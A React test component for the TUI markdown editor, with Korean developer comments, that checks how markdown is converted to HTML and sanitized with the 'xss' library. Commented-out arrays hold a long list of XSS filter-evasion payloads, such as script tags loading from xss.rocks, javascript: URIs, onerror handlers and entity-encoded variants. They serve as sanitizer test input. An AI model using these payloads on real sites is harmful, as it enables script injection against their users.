import React, { Component } from "react";
import "codemirror/lib/codemirror.css";
import "tui-editor/dist/tui-editor.min.css";
import "tui-editor/dist/tui-editor-contents.min.css";
// import Editor from "tui-editor";
import Editor from "./lib/tui-editor/js/editor";

import { getLeftSpaces, getRightSpaces, separateCharsByRegex } from "./utils";
import { size, trim, trimStart, trimEnd } from "lodash";
import xss from "xss";

// import table extension
import "tui-editor/dist/tui-editor-extTable";
import Convertor from "./lib/tui-editor/js/convertor";

// TODO: markdown-it plugin
import iterator from "./markdown-it-for-inline";
import sup_plugin from "./markdown-it-underline";

/*
var content = [
  "normal text",
  "**bold**",
  "*italic*",
  "~~del~~",
  "![image](https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png)",
  "# Heading 1",
  "## Heading 2",
  "### Heading 3",
  "#### Heading 4",
  "##### Heading 5",
  "###### Heading 6",
  "    code block",
  "```js",
  'console.log("fenced code block");',
  "```",
  "<pre>**HTML block**</pre>",
  "* list",
  "    * list indented",
  "1. ordered",
  "2. list",
  "    1. ordered list",
  "    2. indented",
  "",
  "- [ ] task",
  "- [x] list completed",
  "",
  "[link](https://nhnent.github.io/tui.editor/)",
  "> block quote",
  "---",
  "horizontal line",
  "***",
  '`code`, *italic*, **bold**, ~~strikethrough~~, <span style="color:#e11d21">Red color</span>',
  "|table|head|",
  "|---|---|",
  "|table|body|",
  "---",
  "| @cols=2:merged |",
  "| --- | --- |",
  "| table | table |",
  "---",
  "```youtube",
  "OxWqRo34UYI",
  "```",
  "---",
  ":abc:"
].join("\n");
*/

var content = [
  /*
  'javascript: window.alert("xss");', // 일반 텍스트 // xxx

  "![image](https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png)", // <img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" alt="image"> // xxx
  "![image](javascript:window.alert('xss');)", // TUI Convertor 에서 변환되지 않는다. // xxx
  "![image](window.alert('xss');)", // <img src="window.alert('xss');" alt="image"> // src 제거

  '<img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png">', // <img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" alt=""> // xxx
  '<img src="https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png" onload="" onerror="">',
  '<img src="javascript: window.alert("xss");">', // TUI Convertor 에서 encode 처리 &lt;img src="javascript: window.alert("xss");"&gt; // xxx

  "```js",
  'console.log("fenced code block");', // <pre><code data-language="js" class="lang-js">console.log("fenced code block");</code></pre> => <pre><code>console.log("fenced code block");</code></pre> // data-language, class 속성 제거
  "```",

  '<pre><script>window.alert("xss");</script></pre>', // <pre><code></code></pre> // <script> 태그 제거 // xxx
  "[link](https://nhnent.github.io/tui.editor/)", // <a href="https://nhnent.github.io/tui.editor/">link</a> 로 파싱 // xxx
  '<span style="color:#e11d21" class="javascript: window.alert("xss");">xss</span>', // &lt;span style="color:#e11d21" class="javascript: window.alert("xss");"&gt;xss // encode 처리 // xxx
  '<span style="color:#e11d21" class="foo">xss</span>', // <span class="colour" style="color:rgb(225, 29, 33)">xss</span></p> => <p><span>xss</span></p> // class, style 속성 제거 // ???
  '<script>window.alert("xss");</script>', // script 태그는 TUI Convertor 단에서 제거된다. // xxx
  `<img src="/" =_=" title="onerror='prompt(1)'">`, // TUI convertor 에서 제거 // xxx
  `<a href="javascript:\u0061lert(1)">`, // TUI convertor 에서 제거 // xxx

  `<a href="https://www.google.com">google</a>`,
  `<a href="https://www.google.com" onerror="">google</a>`,
  `<a href="https://www.google.com" onload="">google</a>`
  */
  /*
  "test 입니다.",
  "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
  `<IMG SRC="javascript:alert('XSS');">`,
  `<IMG SRC=javascript:alert('XSS')>`,
  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
  `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
  "<IMG SRC=`javascript:alert('RSnake says, 'XSS'')`>",
  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
  `<IMG SRC=# onmouseover="alert('xxs')">`,
  `<IMG SRC= onmouseover="alert('xxs')">`,
  `<IMG onmouseover="alert('xxs')">`,
  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
  `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
  `<IMG SRC="jav	ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
  `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`,
  `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  '<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>',
  `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
  `<SCRIPT SRC=//xss.rocks/.j>`,
  `<IMG SRC="javascript:alert('XSS')"`,
  `<iframe src=http://xss.rocks/scriptlet.html <`,
  `\";alert('XSS');//`,
  `</script><script>alert('XSS');</script>`,
  `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
  `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
  `<BODY BACKGROUND="javascript:alert('XSS')">`,
  `<IMG DYNSRC="javascript:alert('XSS')">`,
  `<IMG LOWSRC="javascript:alert('XSS')">`,
  `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
  `<IMG SRC='vbscript:msgbox("XSS")'>`,
  `<IMG SRC="livescript:[code]">`,
  `<svg/onload=alert('XSS')>`,
  "Set.constructor`alert\x28document.domain\x29```",
  `<BODY ONLOAD=alert('XSS')>`
  */
].join("\n");
console.log("content :", content);

class TestTUIEditor extends Component {
  constructor(props) {
    super(props);

    const _ = this;

    _._editor = null;

    _.state = {
      isViewer: false
    };
  }

  componentDidMount() {
    const _ = this;

    console.log("Editor :", Editor);

    // set own extensions
    Editor.defineExtension("emoticon", function() {
      console.log("emoticon extension");

      // preview
      // convertor
      // eventManager

      // TODO: 가능하면 extension 으로 할 수 있으면 좋을 듯 하다.
      // markdown 에 :abc: 를 넣는다.
      // :abc: 는 위지윅 에디터에 표시될 때는 다른 태그로 치환되어야 한다.
    });

    // youtube extension
    Editor.defineExtension("youtube", function() {
      // add codeBlock 'youtube'

      // runs while markdown-it transforms code block to HTML
      Editor.codeBlockManager.setReplacer("youtube", function(youtubeId) {
        // Indentify multiple code blocks
        var wrapperId =
          "yt" +
          Math.random()
            .toString(36)
            .substr(2, 10);

        // avoid sanitizing iframe tag
        setTimeout(renderYoutube.bind(null, wrapperId, youtubeId), 0);

        return '<div id="' + wrapperId + '"></div>';
      });
    });

    _._editor = new Editor({
      el: document.querySelector("#editor"),
      initialEditType: "wysiwyg",
      previewStyle: "vertical",
      height: "500px",
      initialValue: content,
      toolbarItems: [
        "heading",
        "underline", // TODO: Add custom underline
        "bold",
        "italic",
        // 'strike',
        // 'divider',
        // 'hr',
        // 'quote',
        // 'divider',
        "ul",
        "ol"
        // 'task',
        // 'indent',
        // 'outdent',
        // 'divider',
        // 'table',
        // 'image',
        // 'link',
        // 'divider',
        // 'code',
        // 'codeblock'
      ],
      exts: [
        "scrollSync",
        "colorSyntax",
        "uml",
        "chart",
        "mark",
        "table",
        "youtube",
        "emoticon"
      ]
    });
    _._editor.setPlaceholder("oh yes");

    console.log("_._editor :", _._editor);

    function renderYoutube(wrapperId, youtubeId) {
      var el = document.querySelector("#" + wrapperId);
      el.innerHTML =
        '<iframe width="420" height="315" src="https://www.youtube.com/embed/' +
        youtubeId +
        '"></iframe>';
    }

    // TODO: test markdownit
    // const str = "*he^llo^*\n*^wo^rld*\nfoo";
    // const str = "**h^e^*^llo^***\n***^w^o****rl*d\nfoo";
    // const str = "h**el*l^o^***\n***^worl^*^d^**\n**^f^o**o";
    // const str = "h~~ell~~o\n^world^\n^fo^o";
    const str = "h~~ell~~o\n^world^\n^fo^o^^";

    const md = Convertor.getMarkdownitRenderer();
    console.log("md :", md);
    // TODO: + underline 구현 방법 : use sup_plugin
    md.use(sup_plugin);

    const html = md.render(str);

    console.log("html :", html);

    // TODO: + underline 구현 방법 : use markdown-it-for-inline
    /*
    md.use(iterator, "foo_replace", "text", function(tokens, idx) {
      // https://github.com/markdown-it/markdown-it-for-inline
      const content = tokens[idx].content;
      const underlinedContent = content.replace(
        /(\^)([^\^]+)(\^)/g,
        "<u>$2</u>"
      );
      console.log("underlinedContent :", underlinedContent);

      tokens[idx].content = underlinedContent;
    });

    const html = md
      .render(str)
      .replace(/&lt;u&gt;/g, "<u>")
      .replace(/&lt;\/u&gt;/g, "</u>");

    console.log("html :", html);
    */
  }

  getEditor = () => {
    return "";
    /*
    return (
      <Editor
        ref={this.editorRef}
        initialValue={this.state.content}
        previewStyle="vertical"
        height="600px"
        initialEditType="markdown"
        // useCommandShortcut={true}
        // exts={[
        //   {
        //     name: "chart",
        //     minWidth: 100,
        //     maxWidth: 600,
        //     minHeight: 100,
        //     maxHeight: 300
        //   },
        //   "scrollSync",
        //   "colorSyntax",
        //   "uml",
        //   "mark",
        //   "table"
        // ]}
      />
    );
    */
  };

  getViewer = () => {
    return "";
    /*
    return (
      <Viewer
        ref={this.viewerRef}
        initialValue={this.state.content}
        previewStyle="vertical"
        height="600px"
        initialEditType="markdown"
        // useCommandShortcut={true}
        // exts={[
        //   {
        //     name: "chart",
        //     minWidth: 100,
        //     maxWidth: 600,
        //     minHeight: 100,
        //     maxHeight: 300
        //   },
        //   "scrollSync",
        //   "colorSyntax",
        //   "uml",
        //   "mark",
        //   "table"
        // ]}
      />
    );
    */
  };

  toggleEditorViewer = () => {
    const _ = this;

    _.setState(function(prevState, props) {
      return { isViewer: !prevState.isViewer };
    });
  };

  printConsole = () => {
    const _ = this;
    // this.editorRef.current.getInstance().exec("Bold");

    if (_.state.isViewer) {
      // Viewer
      const viewer = this.viewerRef.current.getInstance();
      console.log("viewer.isMarkdownMode() :", viewer.isMarkdownMode());
      console.log("viewer.isViewer() :", viewer.isViewer());
      console.log("viewer.isWysiwygMode() :", viewer.isWysiwygMode());
      // viewer.setValue("# Hello. viewer.setValue method");

      // public addHook(type: string, handler: HandlerFunc): void;
      // public isMarkdownMode(): boolean;
      // public isViewer(): boolean;
      // public isWysiwygMode(): boolean;
      // public off(type: string): void;
      // public on(type: string, handler: HandlerFunc): void;
      // public remove(): void;
      // public setMarkdown(markdown: string): void;
      // public setValue(markdown: string): void;
    } else {
      const isAllSpacesRegex = /^(\s+)$/;
      const isAllEmptyOrAllSpacesRegex = /^(\s*)$/;
      const leftSpacesRegex = /^(\s*)/;
      const spacesRegex = /\s+/g;

      // const boldItalicMarkdownRegex = /(\*{3}|_{3})([^*]+)\1/;
      // const boldMarkdownRegex = /(\*{2}|_{2})([^*]+)\1/; // TODO:
      // const italicMarkdownRegex = /(\*|_)(\s?)([^*]+)(\s?)(\1)/;
      // const italicMarkdownRegex = /(\*|_)(\s?)([^\s][^*]+[^\s])(\s?)(\1)/g;
      const italicMarkdownRegex = /(\*|_)([^*]+)(\*|_)/g;

      // Editor
      console.log("_._editor :", _._editor);
      const editor = _._editor;

      // --------
      // Create (New)
      // --------
      // 1. get markdown
      const markdown = editor.getMarkdown();
      // console.log("markdown :", markdown);
      // console.log("markdown.split('\\n') :", markdown.split("\n"));
      console.log(`[Create][1. get markdown] : /${markdown}/`);
      // console.log("[Create][Html from Editor] :", editor.getHtml());

      // 2. markdown => mink.md
      // TODO:
      const mkRows = markdown.split("\n");
      const afterMkRows = mkRows.map((row, i) => {
        // let contents = "";
        console.log("before mk row :", row);

        // set any spaces to one space
        row = row.replace(spacesRegex, " ");
        console.log("spaces to one space :", row);

        /*
        if (boldMarkdownRegex.test(row)) {
          // bold
          contents = RegExp.$2;
          console.log("bold contents :", contents);

          // remove row, if there is '' or spaces
          if (isAllSpacesRegex.test(contents)) return "";

          // 컨좌|우공백 => * 외좌|우공백으로 이동
          const leftSpaces = getLeftSpaces(contents);
          const rightSpaces = getRightSpaces(contents);
          row = `${leftSpaces}**${trim(contents)}**${rightSpaces}`;
        } else 
        */
        if (italicMarkdownRegex.test(row)) {
          console.log("match italic");

          const chars = separateCharsByRegex(
            row,
            new RegExp(italicMarkdownRegex),
            matchStr => {
              const contents = matchStr.slice(1, -1), // *text* => text
                leftSpaces = getLeftSpaces(contents),
                rightSpaces = getRightSpaces(contents);

              console.log(
                "contents, leftSpaces.length, rightSpaces.length :",
                contents,
                leftSpaces.length,
                rightSpaces.length
              );

              return `${leftSpaces}*${trim(contents)}*${rightSpaces}`;
            }
          );

          row = chars.join("");
        }

        // reset any spaces to one space
        row = row.replace(spacesRegex, " ");

        console.log("after mk row :", row);
        return row;
      });

      const minkMarkdown = afterMkRows.join("\n");
      console.log(
        `[Create][2. get mink.md. markdown => mink.md] : /${minkMarkdown}/`
      );

      // --------
      // View
      // --------
      // mink.md => markdown

      // markdown => html
      const html = editor.convertor.toHTML(markdown); // markdownit.render
      console.log(`[View][3. get html. markdown => html] : //${html}//`);

      // 모바일 디바이스나, pc 에서 마크다운 + 위지윅 편집기로 작성할 수 있는 컨텐츠는 아래와 같다.
      // 일반 텍스트(normal, bold, italic, del, h2, )
      // "![image](https://cloud.githubusercontent.com/assets/389021/16107646/9729e556-33d8-11e6-933f-5b09fa3a53bb.png)",
      // "    code block",
      // "```js",
      // 'console.log("fenced code block");',
      // "```",
      // <pre><script>window.alert('xss');</script></pre>
      // [link](https://nhnent.github.io/tui.editor/)
      // <span style="color:#e11d21" class="javascript: window.alert('xss');">xss</span>

      // 허용하고 싶은 속성들을 설정할 수도 있다. 그런데, 허용하면 공격을 어떻게 막지?
      // style, class, data-{}, alt, title, src,

      // alt, title 속성도 확인해보자. alt, title 에 javascript 가 적혀 있으면 이상 없는가? // 테스트로는 이상 없다. // xxx
      // <img> src 에 javascript 코드가 있다면 지워지는게 맞다. 이미지 url 이라면 삭제가 안 되어야 한다. // src 에 javascript 가 있을 경우, encode 되므로 해결. // xxx
      // <pre> 태그 안의 <script> 태그와 내용이 제거되고 있는데, 이거 안 지워져도 된다. // xxx
      // <span> 태그의 class 에 javascript 를 썼더니, encode 처리가 되고 있네. // 모든 태그의 data-{}, class, style 속성이 현재 무조건 삭제 되는 듯. 제거하는게 맞음. // xxx
      // a href // href 속성은 링크일 경우 안 걸러지고 있는데 'ㅅ') // xxx
      // <script> 태그는 지워지는게 맞다.

      // 어느 정도는 TUI Convertor 와 xss module 을 신뢰할 수 있다.
      console.log(
        "xss(html) with options :",
        xss(html, {
          /*
          whiteList: {
            a: ["href", "title", "target"]
          },
          */
          // whiteList: {}, // empty, means filter out all tags
          // stripIgnoreTag: true, // filter out all HTML not in the whilelist
          // stripIgnoreTagBody: ["script"], // the script tag is a special case, we need to filter out its content
          // allowCommentTag: false
          /*
          onTag,

          onTagAttr: function(tag, name, value, isWhiteAttr) {
            if (tag === "img" && name === "src") {
              // Use the built-in friendlyAttrValue function to escape attribute
              // values. It supports converting entity tags such as &lt; to printable
              // characters such as <
              console.log("onTagAttr :", value);
              console.log(
                "onTagAttr - xss.friendlyAttrValue :",
                xss.friendlyAttrValue(value)
              );
            }
            // Return nothing, means keep the default handling measure
          },
          onIgnoreTag: function(tag, html, options) {
            if (tag.substr(0, 2) === "x-") {
              // 여기서 언급된 태그의 attr 은 건드리지 않는다.
              // do not filter its attributes
              return html;
            }
          },
          onIgnoreTagAttr: function(tag, name, value, isWhiteAttr) {
            console.log("name :", name);

            if (name.substr(0, 5) === "data-") {
              // escape its value using built-in escapeAttrValue function
              return name + '="' + xss.escapeAttrValue(value) + '"';
            }
          },
          
          */
        })
      );

      return;

      const boldItalicRangeRegex = /(\*{3}|_{3}).*\1/;

      const rows = html.split("\n");
      const afterRows = rows.map((row, i) => {
        console.log("before row :", row);

        row = row
          .replace(/&nbsp;/g, "") // &nbsp; => spaces
          .replace(/\s{2,}/g, " ") // spaces => one space
          .replace(/^\s+/, "") // remove first spaces
          .replace(/\s+$/, "") // remove last spaces
          .replace(/^(<[^>]*>)(\s+)(.*)/, "$1$3") // remove first spaces in tag
          .replace(/(.*)(\s+)(<[^>]*>)$/, "$1$3"); // remove last spaces in tag

        console.log("after row :", row);

        return row;
      });

      const customHtml = afterRows.join("\n");
      console.log("[View][4. html => custom html] :", customHtml);

      return;

      /*
      const preview = _._editor.preview;

      // Customize Html
      const html = editor.convertor.toHTML(markdown + "\n**view**");
      console.log("[View][Html Customized] :", html);

      window.setTimeout(() => {
        console.log("[View][Render View from Customized Html]");
        preview.render(html);
      }, 1000);
      */

      // --------
      // Update (Edit)
      // --------
      console.log(`[Update][Markdown string from DB : /${markdown}/`);

      window.setTimeout(() => {
        console.log(`[Update] Render Editor : /${markdown}/`);
        editor.setMarkdown(markdown, true);

        /*
        const customizedMarkdown = markdown + "\n__edit__";
        console.log("[Update] Customized Markdown :", customizedMarkdown);

        editor.setMarkdown(customizedMarkdown, true);
        */
      }, 500);

      window.setTimeout(() => {
        const md = editor.getMarkdown();

        if (markdown === md) {
          // Create 단계의 markdown string 과 Update 단계의 markdown string 이 동일하다는 것을 증명한다.
          console.log(
            `[Update] Equal. Created Markdown is equal to Updated Markdown`
          );
        } else {
          console.log(
            `[Update] Not Equal. Created Markdown is not equal to Updated Markdown`
          );
        }

        console.log(`[Update][Get and Submit Markdown string => DB] : /${md}/`);
      }, 1000);

      // preview.refresh("# title");
      // console.log("preview.getHTML() :", preview.getHTML());
      // preview.setHTML("<p>hello world</p>");
      // preview.refresh(markdown) // .render(this.convertor.toHTMLWithCodeHightlight(markdown));
      // preview.render(html); // eventManager.emit('previewBeforeHook', html); _$previewContent.html(html);

      // convertor.initHtmlSanitizer
      // convertor.getMarkdownitHighlightRenderer
      // convertor.toHTML
      // convertor.toHTMLWithCodeHightlight
      // convertor.toMarkdown

      // markdown input 시, preview 의 refresh 함수에서 convertor 의 toHTMLWithCodeHightlight 로 get html string
      // 이후, eventManager.listen('convertorAfterMarkdownToHtmlConverted') 으로 html 전송.

      /*
      const editor = this.editorRef.current.getInstance();
      console.log("editor.getHtml() :", editor.getHtml());
      console.log("editor.isViewer() :", editor.isViewer());
      console.log("editor.getMarkdown() :", editor.getMarkdown());
      */

      // public addHook(type: string, handler: HandlerFunc): void;
      // public addWidget(selection: Range, node: Node, style: string, offset?: number): void;
      // public afterAddedCommand(): void;
      // public blur(): void;
      // public changeMode(mode: string, isWithoutFocus?: boolean): void;
      // public changePreviewStyle(style: string): void;
      // public exec(name: string, ...args: any[]): void;
      // public focus(): void;
      // public getCodeMirror(): CodeMirrorType;
      // public getCurrentModeEditor(): MarkDownEditor | WysiwygEditor;
      // public getCurrentPreviewStyle(): string;
      // public getHtml(): string;
      // public getMarkdown(): string;
      // public getRange(): RangeType;
      // public getSelectedText(): string;
      // public getSquire(): SquireExt;
      // public getTextObject(range: RangeType): IMdTextObject | IWwTextObject;
      // public getUI(): IUI;
      // public getValue(): string;
      // public height(height: string): string;
      // public hide(): void;
      // public insertText(text: string): void;
      // public isMarkdownMode(): boolean;
      // public isViewer(): boolean;
      // public isWysiwygMode(): boolean;
      // public minHeight(minHeight: string): string;
      // public moveCursorToEnd(): void;
      // public moveCursorToStart(): void;
      // public off(type: string): void;
      // public on(type: string, handler: HandlerFunc): void;
      // public remove(): void;
      // public removeHook(type: string): void;
      // public reset(): void;
      // public scrollTop(value: number): number;
      // public setHtml(html: string, cursorToEnd?: boolean): void;
      // public setMarkdown(markdown: string, cursorToEnd?: boolean): void;
      // public setUI(UI: IUI): void;
      // public setValue(value: string, cursorToEnd?: boolean): void;
      // public show(): void;
    }
  };

  addEmoticon = () => {
    console.log("addEm");
  };

  render() {
    const _ = this;

    return (
      <div className="app">
        <div id="editor" />

        {/*this.state.isViewer ? _.getViewer() : _.getEditor()*/}
        <button onClick={_.toggleEditorViewer}>Toggle editor/viewer</button>
        <button onClick={_.printConsole}>console editor/viewer</button>
        <button onClick={_.addEmoticon}>Add emoticon</button>
      </div>
    );
  }
}

export default TestTUIEditor;
